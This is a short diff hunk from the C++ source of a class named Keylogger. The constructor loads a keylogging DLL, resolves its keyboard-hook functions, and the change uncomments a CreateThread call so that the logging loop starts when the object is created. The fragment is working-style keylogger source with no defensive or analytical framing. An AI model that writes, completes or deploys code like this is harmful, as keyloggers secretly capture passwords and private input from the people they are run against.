@@ -7,7 +7,7 @@ Keylogger::Keylogger()
 	keylog_dll = LoadLibraryA("KeyLog_Module.dll");
 	SetKeyBoardHook = (SetHook)GetProcAddress(keylog_dll, "SetKeyBoardHook");
 	RemoveKeyBoardHook = (RemoveHook)GetProcAddress(keylog_dll, "RemoveKeyBoardHook");
-	//CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Keylogger::keylog_loop, NULL, NULL, NULL);
+	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Keylogger::keylog_loop, NULL, NULL, NULL);
 }
 
 Keylogger::~Keylogger()
